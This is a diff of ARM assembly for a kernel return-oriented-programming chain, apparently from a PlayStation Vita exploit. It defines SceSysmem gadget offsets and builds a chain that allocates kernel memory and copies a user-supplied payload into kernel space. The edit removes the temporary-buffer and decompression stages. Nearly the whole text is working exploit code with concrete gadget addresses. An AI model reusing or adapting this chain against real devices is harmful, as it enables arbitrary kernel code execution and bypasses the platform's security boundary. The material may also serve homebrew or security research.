@@ -20,7 +20,6 @@
 .equ SceSysmem_pop_pc,                            0x347
 .equ SceSysmem_pop_r0_pc,                         0x31
 .equ SceSysmem_pop_r0_r1_r2_r3_r4_pc,             0x258bd
-.equ SceSysmem_pop_r1_r2_r4_r6_pc,                0x288ff
 .equ SceSysmem_pop_r3_pc,                         0x1d8f
 .equ SceSysmem_pop_r3_r4_r5_r6_r7_pc,             0xf59
 .equ SceSysmem_ldr_r0_r0_blx_r3,                  0x11337
@@ -80,32 +79,6 @@
   // Init krop chain
   init_krop \dst
 
-  // Allocate temporary block
-  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc             // pc
-  push 1, SceSysmem_empty_string                      // r0
-  push 0, SCE_KERNEL_MEMBLOCK_TYPE_KERNEL_RW          // r1
-  push 0, (payload_size + 0xfff) & ~0xfff             // r2
-  push 0, NULL                                        // r3
-  push 1, SceSysmem_ksceKernelAllocMemBlock           // r4
-  push 1, SceSysmem_blx_r4_pop_r4_pc                  // pc
-  push 9, 0xDEADBEEF                                  // r4
-
-  // Save temporary blockid
-  push 1, SceSysmem_pop_r3_pc                         // pc
-  push 2, payload_temp_blockid                        // r3
-  push 1, SceSysmem_str_r0_r3_movs_r0_0_pop_r4_pc     // pc
-  push 9, 0xDEADBEEF                                  // r4
-
-  // Get temporary block
-  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc             // pc
-  push 2, payload_temp_blockid                        // r0
-  push 2, payload_temp_block                          // r1
-  push 9, 0xDEADBEEF                                  // r2
-  push 1, SceSysmem_blx_r4_pop_r4_pc                  // r3
-  push 1, SceSysmem_ksceKernelGetMemBlockBase         // r4
-  push 1, SceSysmem_ldr_r0_r0_blx_r3                  // pc
-  push 9, 0xDEADBEEF                                  // r4
-
   // Allocate code block
   push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc             // pc
   push 1, SceSysmem_empty_string                      // r0
@@ -134,40 +107,11 @@
 
   // Copy compressed payload from user to temporary block
   push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc             // pc
-  push 2, payload_temp_block                          // r0
+  push 2, payload_code_block                          // r0
   push 0, payload_start                               // r1
   push 0, payload_size                                // r2
   push 1, SceSysmem_blx_r4_pop_r4_pc                  // r3
   push 1, SceSysmem_ksceKernelMemcpyUserToKernel      // r4
-  push 1, SceSysmem_ldr_r0_r0_blx_r3                  // pc
-  push 9, 0xDEADBEEF                                  // r4
-
-  // Decompress payload to code block
-  push 1, SceSysmem_pop_r0_pc                         // pc
-  push 2, payload_temp_block                          // r0
-  push 1, SceSysmem_pop_r3_pc                         // pc
-  push 1, SceSysmem_pop_r1_r2_r4_r6_pc                // r3
-  push 1, SceSysmem_ldr_r0_r0_blx_r3                  // pc
-  push 0, PAYLOAD_DECOMPRESSED_SIZE                   // r1
-  push 1, SceSysmem_mov_r2_r5_blx_r6                  // r2
-  push 1, SceSysmem_ksceDeflateDecompress             // r4
-  push 1, SceSysmem_pop_r0_pc                         // r6
-  push 1, SceSysmem_movs_r5_r0_blx_r2                 // pc
-  push 2, payload_code_block                          // r0
-  push 1, SceSysmem_pop_r3_pc                         // pc
-  push 1, SceSysmem_pop_r3_pc                         // r3
-  push 1, SceSysmem_ldr_r0_r0_blx_r3                  // pc
-  push 0, NULL                                        // r3
-  push 1, SceSysmem_blx_r4_pop_r4_pc                  // pc
-  push 9, 0xDEADBEEF                                  // r4
-
-  // Free temporary block
-  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc             // pc
-  push 2, payload_temp_blockid                        // r0
-  push 9, 0xDEADBEEF                                  // r1
-  push 9, 0xDEADBEEF                                  // r2
-  push 1, SceSysmem_blx_r4_pop_r4_pc                  // r3
-  push 1, SceSysmem_ksceKernelFreeMemBlock            // r4
   push 1, SceSysmem_ldr_r0_r0_blx_r3                  // pc
   push 9, 0xDEADBEEF                                  // r4
 
